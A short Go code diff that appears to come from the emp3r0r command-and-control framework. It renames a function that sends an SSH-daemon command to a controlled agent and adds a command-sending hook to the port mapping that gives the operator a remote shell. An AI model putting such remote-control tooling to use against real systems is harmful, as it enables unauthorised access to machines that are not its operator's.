@@ -111,7 +111,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 			args = "--"
 		}
 		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", emp3r0r_def.C2CmdSSHD, shell, port, args)
-		err = agents.SendCmdToCurrentTarget(cmd, cmd_id)
+		err = agents.SendCmdToCurrentAgent(cmd, cmd_id)
 		if err != nil {
 			return
 		}
@@ -150,6 +150,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		pf.Description = fmt.Sprintf("ssh shell (%s)", shell)
 		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
 		pf.Lport, pf.To = lport, to
+		pf.SendCmdFunc = agents.SendCmd
 		go func() {
 			// remember the port mapping and shell and agent
 			SSHShellPort[shell] = &SSH_SHELL_Mapping{
